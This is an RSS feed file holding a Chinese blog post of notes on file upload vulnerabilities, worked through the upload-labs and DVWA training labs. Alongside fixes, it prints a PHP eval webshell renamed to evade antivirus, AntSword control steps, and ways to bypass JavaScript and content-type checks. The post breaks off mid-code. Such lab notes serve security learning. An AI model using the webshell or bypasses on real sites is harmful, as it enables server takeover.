@@ -1,0 +1,457 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Upload-Labs on</title><link>https://b.cornradio.org/tags/upload-labs/</link><description>Recent content in Upload-Labs on</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><lastBuildDate>Mon, 31 Jul 2023 20:59:37 +0800</lastBuildDate><atom:link href="https://b.cornradio.org/tags/upload-labs/index.xml" rel="self" type="application/rss+xml"/><item><title>文件上传漏洞笔记</title><link>https://b.cornradio.org/p/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/</link><pubDate>Mon, 31 Jul 2023 20:59:37 +0800</pubDate><guid>https://b.cornradio.org/p/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/</guid><description>&lt;h2 id="00-文件上传简介"&gt;00-文件上传简介
+&lt;/h2&gt;&lt;p&gt;upload-labs 靶场 &lt;a class="link" href="https://github.com/c0ny1/upload-labs" target="_blank" rel="noopener"
+&gt;c0ny1/upload-labs&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;蚁剑 &lt;a class="link" href="https://www.yuque.com/antswordproject/antsword/qg3g73" target="_blank" rel="noopener"
+&gt;第一个Shell (yuque.com)&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;文件上传通常要上传如 php asp 这种文件，服务器在你访问上传的文件后，对文件进行解析/执行。&lt;/p&gt;
+&lt;p&gt;比如你上传了xxx.php ,然后你访问这个文件，这样服务器就会执行你的代码，配合蚁剑你就可以控制整个网站的文件内容。&lt;/p&gt;
+&lt;p&gt;upload-labs 打法这里还有个博客，&lt;a class="link" href="https://blog.csdn.net/elephantxiang/article/details/120660685?spm=1001.2014.3001.5502" target="_blank" rel="noopener"
+&gt;(34条消息) upload-labs通关大全（已完结）_仙女象的博客-CSDN博客&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id="php-例子"&gt;php 例子
+&lt;/h3&gt;&lt;p&gt;为了理解文件上传，请搭建phpstudy环境，自己运行下面的 html 和 php&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-html" data-lang="html"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;form&lt;/span&gt; &lt;span class="na"&gt;action&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;upload.php&amp;#34;&lt;/span&gt; &lt;span class="na"&gt;method&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;post&amp;#34;&lt;/span&gt; &lt;span class="na"&gt;enctype&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;multipart/form-data&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;label&lt;/span&gt; &lt;span class="na"&gt;for&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;file&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;Filename:&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;label&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;input&lt;/span&gt; &lt;span class="na"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;file&amp;#34;&lt;/span&gt; &lt;span class="na"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;file&amp;#34;&lt;/span&gt; &lt;span class="na"&gt;id&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;file&amp;#34;&lt;/span&gt; &lt;span class="p"&gt;/&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;br&lt;/span&gt; &lt;span class="p"&gt;/&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;input&lt;/span&gt; &lt;span class="na"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;submit&amp;#34;&lt;/span&gt; &lt;span class="na"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;submit&amp;#34;&lt;/span&gt; &lt;span class="na"&gt;value&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;Submit&amp;#34;&lt;/span&gt; &lt;span class="p"&gt;/&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;form&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;&amp;lt;form action=&amp;quot;upload.php&amp;quot;&lt;/code&gt; 这里的 &lt;code&gt;upload.php&lt;/code&gt; 可以修改成任何网址，对其他网站进行上传。&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;enctype=&amp;quot;multipart/form-data&amp;quot;&lt;/code&gt; 这句保留，表示上传为二进制格式。&lt;/p&gt;
+&lt;h3 id="文件上传代码"&gt;文件上传代码
+&lt;/h3&gt;&lt;p&gt;&lt;code&gt;$_FILES[&amp;quot;file&amp;quot;][&amp;quot;error&amp;quot;]&lt;/code&gt; == 0 时代表正常无错误&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;0; 没有错误发生，文件上传成功。&lt;/li&gt;
+&lt;li&gt;1; 上传的文件超过了php.ini 中upload_max_filesize 选项限制的值。&lt;/li&gt;
+&lt;li&gt;2; 上传文件的大小超过了HTML 表单中MAX_FILE_SIZE 选项指定的值。&lt;/li&gt;
+&lt;li&gt;3; 文件只有部分被上传。&lt;/li&gt;
+&lt;li&gt;4; 没有文件被上传。
+如果正常上传后会把文件各种属性和 放置位置 打印。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;&amp;lt;?&lt;/span&gt;&lt;span class="nx"&gt;php&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_FILES&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;file&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;error&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;Error: &amp;#34;&lt;/span&gt; &lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="nv"&gt;$_FILES&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;file&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;error&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;&amp;lt;br /&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;Upload: &amp;#34;&lt;/span&gt; &lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="nv"&gt;$_FILES&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;file&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;name&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;&amp;lt;br /&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;Type: &amp;#34;&lt;/span&gt; &lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="nv"&gt;$_FILES&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;file&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;type&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;&amp;lt;br /&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;Size: &amp;#34;&lt;/span&gt; &lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_FILES&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;file&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;size&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt; &lt;span class="mi"&gt;1024&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34; Kb&amp;lt;br /&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;Stored in: &amp;#34;&lt;/span&gt; &lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="nv"&gt;$_FILES&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;file&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;tmp_name&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id="文件上传的分类"&gt;文件上传的分类
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;任意文件上传漏洞 / 直接文件上传漏洞 （高危）&lt;/li&gt;
+&lt;li&gt;有条件的上传漏洞&lt;/li&gt;
+&lt;li&gt;权限认证没处理&lt;/li&gt;
+&lt;li&gt;上传逻辑有问题&lt;/li&gt;
+&lt;li&gt;中间件或者系统特性上传&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;如果攻击者能直接上传恶意脚本到网站存放的目录，且这个目录可解析动态脚本语言，那么攻击者就能够直接获取网站权限&lt;/p&gt;
+&lt;h3 id="文件上传漏洞的修复方案"&gt;文件上传漏洞的修复方案
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;在网站中需要存在上传模块，需要做好权限认证，不能让匿名用户可访问。&lt;/li&gt;
+&lt;li&gt;文件上传目录设置为禁止脚本文件执行。这样设置即使被上传后门的动态脚本也不能解析，导致攻击者放弃这个攻击途径。&lt;/li&gt;
+&lt;li&gt;设置上传白名单，白名单只允许图片上传如，jpg png gif 其他文件均不允许上传&lt;/li&gt;
+&lt;li&gt;上传的后缀名，一定要设置成图片格式如 jpg png gif&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id="01-使用蚁剑"&gt;01-使用蚁剑
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;下载 &lt;a class="link" href="https://github.com/AntSwordProject/AntSword-Loader/releases" target="_blank" rel="noopener"
+&gt;https://github.com/AntSwordProject/AntSword-Loader/releases&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;安装的时候他会下载github文件并解压，如果卡住了就自行解压然后重新选择那个目录。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;参考教程： 蚁剑 &lt;a class="link" href="https://www.yuque.com/antswordproject/antsword/qg3g73" target="_blank" rel="noopener"
+&gt;第一个Shell (yuque.com)&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;上传文件&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;因为ant总被火绒拦掉所以…… 我改成了Post ”ass“&lt;/li&gt;
+&lt;li&gt;上传文件内容：&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;?php eval($_POST[&amp;#39;ass&amp;#39;]);
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;新建站点
+&lt;img src="https://i.imgur.com/AiuKhN0.png"
+loading="lazy"
+alt="Imgur"
+&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;可以修改/删除/浏览 web站点的所有文件。
+&lt;img src="https://i.imgur.com/sLFw53X.png"
+loading="lazy"
+alt="Imgur"
+&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id="01-dvwa---upload-file"&gt;01-DVWA - upload file
+&lt;/h2&gt;&lt;h3 id="先看一下源代码"&gt;先看一下源代码
+&lt;/h3&gt;&lt;p&gt;vulnerabilities/upload/source/low.php&lt;/p&gt;
+&lt;p&gt;如果接收到了上传请求，代码会将上传文件保存到指定的目录中。&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;&amp;lt;?&lt;/span&gt;&lt;span class="nx"&gt;php&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="nx"&gt;isset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Upload&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="c1"&gt;// Where are we going to be writing to?
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nv"&gt;$target_path&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;DVWA_WEB_PAGE_TO_ROOT&lt;/span&gt; &lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;hackable/uploads/&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="nv"&gt;$target_path&lt;/span&gt; &lt;span class="o"&gt;.=&lt;/span&gt; &lt;span class="nx"&gt;basename&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="nv"&gt;$_FILES&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;uploaded&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;][&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;name&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="c1"&gt;// Can we move the file to the upload folder?
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="nx"&gt;move_uploaded_file&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="nv"&gt;$_FILES&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;uploaded&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;][&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;tmp_name&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="nv"&gt;$target_path&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="c1"&gt;// No
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;lt;pre&amp;gt;Your image was not uploaded.&amp;lt;/pre&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="c1"&gt;// Yes!
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;&amp;lt;pre&amp;gt;&lt;/span&gt;&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="nv"&gt;$target_path&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt; succesfully uploaded!&amp;lt;/pre&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="err"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id="上传一个phpinfo"&gt;上传一个phpinfo
+&lt;/h3&gt;&lt;p&gt;上传phpinfo是为了非暴力测试，攻击的话要用一句话。
+如果phpinfo执行了，Post其实也大差不差。&lt;/p&gt;
+&lt;p&gt;要上传的 php 的内容为&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="o"&gt;&amp;lt;?&lt;/span&gt;&lt;span class="nx"&gt;php&lt;/span&gt; &lt;span class="nx"&gt;phpinfo&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h2 id="02--绕过js文件类型检查"&gt;02- 绕过js文件类型检查
+&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;适用范围：网站仅仅通过前端js代码进行文件后缀名检测&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Pass-01&lt;/p&gt;
+&lt;h3 id="方法1-修改html"&gt;方法1 修改html
+&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;打开 F12 ，修改form 的 onsubmit ，删除 checkFile() 函数&lt;/li&gt;
+&lt;li&gt;重新上传php文件&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-html" data-lang="html"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;form&lt;/span&gt; &lt;span class="na"&gt;enctype&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;multipart/form-data&amp;#34;&lt;/span&gt; &lt;span class="na"&gt;method&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;post&amp;#34;&lt;/span&gt; &lt;span class="na"&gt;onsubmit&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;return checkFile()&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;p&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;请选择要上传的图片：&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;p&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;p&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;div&lt;/span&gt; &lt;span class="na"&gt;id&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;msg&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;div&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;input&lt;/span&gt; &lt;span class="na"&gt;class&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;input_file&amp;#34;&lt;/span&gt; &lt;span class="na"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;file&amp;#34;&lt;/span&gt; &lt;span class="na"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;upload_file&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;input&lt;/span&gt; &lt;span class="na"&gt;class&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;button&amp;#34;&lt;/span&gt; &lt;span class="na"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;submit&amp;#34;&lt;/span&gt; &lt;span class="na"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;submit&amp;#34;&lt;/span&gt; &lt;span class="na"&gt;value&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;上传&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;p&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;form&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id="方法2-抓包替换后缀名"&gt;方法2 抓包替换后缀名
+&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;选择 1.jpg 文件上传（文件内容是php代码）&lt;/li&gt;
+&lt;li&gt;用抓包工具修改后post内容的文件后缀名（这时候payload 已经通过了js校验）&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;img src="https://i.imgur.com/ofmgpwh.png"
+loading="lazy"
+alt="Imgur"
+&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id="04-绕过content-type"&gt;04-绕过content-type
+&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;适用范围：网站后台代码对上传文件de content-type 进行校验&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;关键语句（php会对content-type进行验证）：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="nv"&gt;$_FILES&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;upload_file&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;][&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;type&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;image/jpeg&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$_FILES&lt;/span&gt;&lt;span 